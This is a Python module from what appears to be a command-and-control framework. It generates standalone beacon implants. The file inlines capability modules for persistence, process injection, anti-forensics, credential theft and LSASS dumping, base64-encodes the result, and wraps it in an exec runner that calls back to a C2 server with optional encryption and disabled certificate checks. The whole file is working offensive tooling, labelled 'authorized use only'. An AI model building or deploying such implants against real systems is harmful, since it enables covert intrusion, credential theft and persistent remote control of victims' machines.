"""Payload generation helpers: produce self-contained beacon launchers.

The generated payload is a single standalone .py file (stdlib only) that
inlines the command catalog + beacon client + capability modules, so it runs
fully outside the package.
"""
import base64
import os


_SRC = os.path.dirname(os.path.abspath(__file__))

_COMMANDS_SRC = open(os.path.join(_SRC, "..", "commands.py")).read()
_BEACON_SRC = open(os.path.join(_SRC, "..", "client", "beacon.py")).read()

_MODULE_FILES = {
    "persistence": ("persistence.py", "persistence"),
    "injection": ("injection.py", "injection"),
    "antiforensics": ("antiforensics.py", "antiforensics"),
    "obfuscation": ("obfuscation.py", "obfuscation"),
    "socks": ("socks.py", "socks"),
    "credentials": ("credentials.py", "credentials"),
    # LSASS dump - authorized testing only; see cs/modules/lsass.py
    "lsass": ("lsass.py", "lsass"),
}
# beacon handler attr name for each module
_MOD_ATTR = {"persistence": "persist", "injection": "inject",
             "antiforensics": "af", "obfuscation": "obf", "socks": "socks",
             "credentials": "credentials", "crypto": "crypto",
             "lsass": "lsass"}


def _module_source(name):
    return open(os.path.join(_SRC, "..", "modules", _MODULE_FILES[name][0])).read()


def _crypto_source():
    """Inline `crypto` package: aes.py + __init__.py merged into one namespace so
    the standalone beacon's `from ..crypto import derive_key, GCMCipher` maps to
    the injected module. aes.py is exec'd first (defines AESCipher); __init__.py's
    relative import line is dropped since AES is already in scope."""
    aes_src = open(os.path.join(_SRC, "..", "crypto", "aes.py")).read()
    init_src = open(os.path.join(_SRC, "..", "crypto", "__init__.py")).read()
    init_src = init_src.replace("from .aes import AESCipher\n", "")
    return aes_src + "\n\n" + init_src


def build_standalone_beacon():
    """Return the source of a self-contained beacon that imports no
    package-relative modules. Command registry + capability modules + crypto are
    inlined as `types.ModuleType` namespaces; Beacon._load_import is patched to
    materialise them lazily."""
    beacon_src = _BEACON_SRC

    # Rewrite relative imports in the beacon source:
    beacon_src = beacon_src.replace(
        "from .. import commands as cmd\n", "cmd = _inject_cmd()\n")
    beacon_src = beacon_src.replace(
        "from ..crypto import derive_key, GCMCipher",
        "crypto = self._load_import('crypto')\n"
        "            derive_key = crypto.derive_key\n"
        "            GCMCipher = crypto.GCMCipher")

    # strip the trailing main() guard so exec of this source doesn't auto-run it
    tail = '\nif __name__ == "__main__":\n    main()'
    if beacon_src.rstrip().endswith("main()"):
        beacon_src = beacon_src.rstrip()
        beacon_src = beacon_src.replace(tail, "", 1)

    # Part 1 (prepended): pure function defs -- no Beacon reference yet.
    inject = (
        "def _inject_cmd():\n"
        "    import types\n"
        "    m = types.ModuleType('cmd')\n"
        "    exec(" + repr(_COMMANDS_SRC) + ", m.__dict__)\n"
        "    return m\n"
        "def _inject_modules():\n"
        "    import types\n"
        "    _all = {}\n"
    )
    for modname, (_, _) in _MODULE_FILES.items():
        inject += (
            f"    _m_m{modname} = types.ModuleType({modname!r}); "
            f"exec({repr(_module_source(modname))}, _m_m{modname}.__dict__); "
            f"_all[{_MOD_ATTR[modname]!r}] = _m_m{modname}\n"
        )
    # crypto namespace: inject aes + init under the name 'crypto'
    crypto_src = _crypto_source()
    inject += (
        "    _m_crypto = types.ModuleType('crypto'); "
        f"exec({repr(crypto_src)}, _m_crypto.__dict__); "
        "_all['crypto'] = _m_crypto\n"
        "    return _all\n"
    )

    # Part 2 (appended after Beacon exists): patch _load_import to consult the
    # lazily-materialised modules.
    patch = (
        "\n"
        "Beacon._injected = None\n"
        "def _load_import(self, name):\n"
        "    if Beacon._injected is None:\n"
        "        Beacon._injected = _inject_modules()\n"
        "    _cmap = {'persistence':'persist','injection':'inject',"
        "'antiforensics':'af','obfuscation':'obf','socks':'socks',"
        "'credentials':'credentials','lsass':'lsass','crypto':'crypto'}\n"
        "    injected = Beacon._injected.get(_cmap.get(name, name))\n"
        "    if injected is not None:\n"
        "        return injected\n"
        "    try:\n"
        "        return __import__('cs.modules.'+name, fromlist=[name])\n"
        "    except Exception:\n"
        "        return None\n"
        "Beacon._load_import = _load_import\n"
    )
    return inject + beacon_src + patch


def _robust_runner(server_url, interval, jitter, key=None, no_verify=False):
    src = build_standalone_beacon()
    b64 = base64.b64encode(src.encode()).decode()
    argv = ["'beacon'", f"'{server_url}'", "'--interval'", repr(str(interval)),
            "'--jitter'", repr(str(jitter))]
    if key:
        argv += ["'--key'", repr(key)]
    if no_verify:
        argv += ["'--no-verify'"]
    argv_src = "[" + ",".join(argv) + "]"
    return (
        "# cscli beacon payload (generated, authorized use only)\n"
        "import base64,sys\n"
        f"_S='{b64}'\n"
        "exec(base64.b64decode(_S).decode())\n"
        f"sys.argv={argv_src}\n"
        "main()\n"
    )


def write_payload(server_url, out_path, interval=5, jitter=0.2, key=None, no_verify=False):
    """Write a standalone beacon runner .py file pointed at server_url.

    If `key` is given, the beacon's C2 channel uses AES-GCM (the listener must
    be configured with the same passphrase). Set no_verify=True when the
    listener is HTTPS with a self-signed cert."""
    with open(out_path, "w") as f:
        f.write(_robust_runner(server_url, interval, jitter, key=key, no_verify=no_verify))
    os.chmod(out_path, 0o755)
    return out_path


def python_one_liner(server_url, interval=5, jitter=0.2, key=None, no_verify=False):
    """Return the inline runner source (without writing to disk)."""
    return _robust_runner(server_url, interval, jitter, key=key, no_verify=no_verify)
